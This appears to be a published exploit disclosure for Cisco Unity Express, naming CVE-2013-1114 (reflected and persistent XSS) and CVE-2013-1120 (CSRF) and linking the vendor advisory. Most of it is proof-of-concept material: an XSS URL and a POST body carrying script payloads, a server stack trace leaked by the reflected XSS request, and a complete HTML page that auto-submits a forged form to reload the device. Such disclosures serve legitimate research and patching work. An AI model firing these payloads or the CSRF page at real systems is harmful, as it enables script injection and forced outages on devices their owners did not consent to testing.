@@ -1,0 +1,157 @@
+# Exploit Title: Cisco Unity Express Multiple Vulnerabilities
+# Reported: December 2012
+# Disclosed: February 2013
+# Author: Jacob Holcomb of Independent Security Evaluators
+# CVE: XSS - CVE-2013-1114 and CSRF - CVE-2013-1120
+# http://infosec42.blogspot.com/2013/02/cisco-unity-express-vulnerabilites.html
+
+Cisco Advisory
+http://tools.cisco.com/security/center/content/CiscoSecurityNotice/CVE-2013-1114
+http://tools.cisco.com/security/center/content/CiscoSecurityNotice/CVE-2013-1120 
+
+Proof of Concept
+XSS - CVE-2013-1114:
+GET:
+Reflective XSS & Info disclosure
+http://X.X.X.X/Web/SA2/ScriptList.do?gui_pagenotableData=><script>alert(42)</script>
+
+Information Disclosure
+Location: /Web/WEB-INF/screens/main.jsp
+Error Location: /Web/WEB-INF/screens/prompts/ListScripts.jsp
+Internal Servlet Error:
+
+javax.servlet.ServletException: invalid character at position 1 in >
+org.apache.jasper.runtime.PageContextImpl.handlePageException (Unknown Source)
+WEB_0002dINF.screens.prompts.ListScripts._jspService (ListScripts.java:2245)
+org.apache.jasper.runtime.HttpJspBase.service (Unknown Source)
+javax.servlet.http.HttpServlet.service (HttpServlet.java)
+org.apache.tomcat.facade.ServletHandler.doService (Unknown Source)
+org.apache.tomcat.core.Handler.invoke (Unknown Source)
+org.apache.tomcat.core.Handler.service (Unknown Source)
+org.apache.tomcat.facade.ServletHandler.service (Unknown Source)
+org.apache.tomcat.facade.RequestDispatcherImpl.doInclude (Unknown Source)
+org.apache.tomcat.facade.RequestDispatcherImpl.access$000 (Unknown Source)
+org.apache.tomcat.facade.RequestDispatcherImpl$RDIAction.run (Unknown Source)
+org.apache.tomcat.util.compat.Jdk12Support$PrivilegedProxy.run (Unknown Source)
+java.security.AccessController.doPrivileged (AccessController.java:273)
+org.apache.tomcat.util.compat.Jdk12Support.doPrivileged (Unknown Source)
+org.apache.tomcat.facade.RequestDispatcherImpl.include (Unknown Source)
+org.apache.jasper.runtime.PageContextImpl.include (Unknown Source)
+WEB_0002dINF.screens.main._jspService (main.java:396)
+org.apache.jasper.runtime.HttpJspBase.service (Unknown Source)
+javax.servlet.http.HttpServlet.service (HttpServlet.java)
+org.apache.tomcat.facade.ServletHandler.doService (Unknown Source)
+org.apache.tomcat.core.Handler.invoke (Unknown Source)
+org.apache.tomcat.core.Handler.service (Unknown Source)
+org.apache.tomcat.facade.ServletHandler.service (Unknown Source)
+org.apache.tomcat.facade.RequestDispatcherImpl.doForward (Unknown Source)
+org.apache.tomcat.facade.RequestDispatcherImpl.access$100 (Unknown Source)
+org.apache.tomcat.facade.RequestDispatcherImpl$RDIAction.run (Unknown Source)
+org.apache.tomcat.util.compat.Jdk12Support$PrivilegedProxy.run (Unknown Source)
+java.security.AccessController.doPrivileged (AccessController.java:273)
+org.apache.tomcat.util.compat.Jdk12Support.doPrivileged (Unknown Source)
+org.apache.tomcat.facade.RequestDispatcherImpl.forward (Unknown Source)
+org.apache.struts.action.ActionServlet.processActionForward (ActionServlet.java:1759)
+org.apache.struts.action.ActionServlet.process (ActionServlet.java:1596)
+com.cisco.aesop.vmgui.framework.WebController.process (WebController.java:157)
+org.apache.struts.action.ActionServlet.doGet (ActionServlet.java:492)
+javax.servlet.http.HttpServlet.service (HttpServlet.java)
+javax.servlet.http.HttpServlet.service (HttpServlet.java)
+org.apache.tomcat.facade.ServletHandler.doService (Unknown Source)
+org.apache.tomcat.core.Handler.invoke (Unknown Source)
+org.apache.tomcat.core.Handler.service (Unknown Source)
+org.apache.tomcat.facade.ServletHandler.service (Unknown Source)
+org.apache.tomcat.core.ContextManager.internalService (Unknown Source)
+org.apache.tomcat.core.ContextManager.service (Unknown Source)
+org.apache.tomcat.modules.server.Http10Interceptor.processConnection (Unknown Source)
+org.apache.tomcat.util.net.TcpWorkerThread.runIt (Unknown Source)
+org.apache.tomcat.util.threads.ThreadPool$ControlRunnable.run (Unknown Source)
+java.lang.Thread.run (Thread.java:777)
+
+Root cause:
+java.lang.NumberFormatException: invalid character at position 1 in >
+java.lang.Throwable. (Throwable.java:166)
+java.lang.Integer.parseInt (Integer.java:775)
+java.lang.Integer.parseInt (Integer.java:262)
+com.cisco.aesop.gui.taglibs.PagingTableTag.doAfterBody (PagingTableTag.java:274)
+WEB_0002dINF.screens.prompts.ListScripts._jspService (ListScripts.java:1903)
+org.apache.jasper.runtime.HttpJspBase.service (Unknown Source)
+javax.servlet.http.HttpServlet.service (HttpServlet.java)
+org.apache.tomcat.facade.ServletHandler.doService (Unknown Source)
+org.apache.tomcat.core.Handler.invoke (Unknown Source)
+org.apache.tomcat.core.Handler.service (Unknown Source)
+org.apache.tomcat.facade.ServletHandler.service (Unknown Source)
+org.apache.tomcat.facade.RequestDispatcherImpl.doInclude (Unknown Source)
+org.apache.tomcat.facade.RequestDispatcherImpl.access$000 (Unknown Source)
+org.apache.tomcat.facade.RequestDispatcherImpl$RDIAction.run (Unknown Source)
+org.apache.tomcat.util.compat.Jdk12Support$PrivilegedProxy.run (Unknown Source)
+java.security.AccessController.doPrivileged (AccessController.java:273)
+org.apache.tomcat.util.compat.Jdk12Support.doPrivileged (Unknown Source)
+org.apache.tomcat.facade.RequestDispatcherImpl.include (Unknown Source)
+org.apache.jasper.runtime.PageContextImpl.include (Unknown Source)
+WEB_0002dINF.screens.main._jspService (main.java:396)
+org.apache.jasper.runtime.HttpJspBase.service (Unknown Source)
+javax.servlet.http.HttpServlet.service (HttpServlet.java)
+org.apache.tomcat.facade.ServletHandler.doService (Unknown Source)
+org.apache.tomcat.core.Handler.invoke (Unknown Source)
+org.apache.tomcat.core.Handler.service (Unknown Source)
+org.apache.tomcat.facade.ServletHandler.service (Unknown Source)
+org.apache.tomcat.facade.RequestDispatcherImpl.doForward (Unknown Source)
+org.apache.tomcat.facade.RequestDispatcherImpl.access$100 (Unknown Source)
+org.apache.tomcat.facade.RequestDispatcherImpl$RDIAction.run (Unknown Source)
+org.apache.tomcat.util.compat.Jdk12Support$PrivilegedProxy.run (Unknown Source)
+java.security.AccessController.doPrivileged (AccessController.java:273)
+org.apache.tomcat.util.compat.Jdk12Support.doPrivileged (Unknown Source)
+org.apache.tomcat.facade.RequestDispatcherImpl.forward (Unknown Source)
+org.apache.struts.action.ActionServlet.processActionForward (ActionServlet.java:1759)
+org.apache.struts.action.ActionServlet.process (ActionServlet.java:1596)
+com.cisco.aesop.vmgui.framework.WebController.process (WebController.java:157)
+org.apache.struts.action.ActionServlet.doGet (ActionServlet.java:492)
+javax.servlet.http.HttpServlet.service (HttpServlet.java)
+javax.servlet.http.HttpServlet.service (HttpServlet.java)
+org.apache.tomcat.facade.ServletHandler.doService (Unknown Source)
+org.apache.tomcat.core.Handler.invoke (Unknown Source)
+org.apache.tomcat.core.Handler.service (Unknown Source)
+org.apache.tomcat.facade.ServletHandler.service (Unknown Source)
+org.apache.tomcat.core.ContextManager.internalService (Unknown Source)
+org.apache.tomcat.core.ContextManager.service (Unknown Source)
+org.apache.tomcat.modules.server.Http10Interceptor.processConnection (Unknown Source)
+org.apache.tomcat.util.net.TcpWorkerThread.runIt (Unknown Source)
+org.apache.tomcat.util.threads.ThreadPool$ControlRunnable.run (Unknown Source)
+java.lang.Thread.run (Thread.java:777)
+
+
+
+POST:
+Persistent XSS
+http://X.X.X.X/Web/SA3/AddHoliday.do
+POST Data: holiday.description=><script>alert(42)</script>&submitType=ADD
+
+
+CSRF - CVE-2013-1120:
+
+<html>
+<!-- # Exploit Title: Cisco Unity Express CSRF
+     # Date: Discovered and reported December 2012
+     # Disclosed: February 2013
+     # Author: Jacob Holcomb of Independent Security Evaluators
+     # Software: Cisco Unity Express
+     # CVE : CVE-2013-1120 for the CSRF
+     # Note: All the HTML forms are susceptible to forgery -->
+
+<head>
+<title>Reload Cisco Unity Express CSRF</title>
+</head>
+
+<body>
+
+<form name="CUEreload" action="http://X.X.X.X/Web/SA/SaveConfiguration.do" method="post">
+<input type="hidden" name="submitType" value="RELOAD"/>
+</form>
+
+<script>
+document.CUEreload.submit();
+</script>
+
+</body>
+</html>
